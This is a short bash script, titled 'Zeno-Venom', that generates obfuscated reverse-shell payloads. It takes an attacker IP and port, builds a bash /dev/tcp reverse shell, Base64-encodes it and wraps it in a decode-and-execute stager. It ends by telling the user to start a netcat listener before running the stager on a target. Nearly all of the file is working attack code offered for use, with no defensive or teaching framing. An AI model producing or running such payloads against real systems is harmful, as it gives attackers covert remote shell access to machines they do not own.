#!/bin/bash
# Zeno-Venom: Base64 Reverse Shell Generator

if [ "$#" -ne 2 ]; then
    echo "Usage: ./zeno_venom.sh <YOUR_IP> <YOUR_PORT>"
    exit 1
fi

LHOST=$1
LPORT=$2

echo -e "\n============================================="
echo -e "   🐍 ZENO-VENOM: PAYLOAD GENERATOR"
echo -e "=============================================\n"

# The raw bash reverse shell
RAW_PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"

# Encode the payload in Base64
B64_PAYLOAD=$(echo -n "$RAW_PAYLOAD" | base64 -w 0)

# Wrap it in an execution stager
STAGER="echo $B64_PAYLOAD | base64 -d | bash"

echo "[*] LHOST : $LHOST"
echo "[*] LPORT : $LPORT"
echo "[+] Obfuscated Payload Generated:"
echo "---------------------------------------------------"
echo "$STAGER"
echo "---------------------------------------------------"
echo "[!] Set up your listener (nc -lvnp $LPORT) before executing on target."
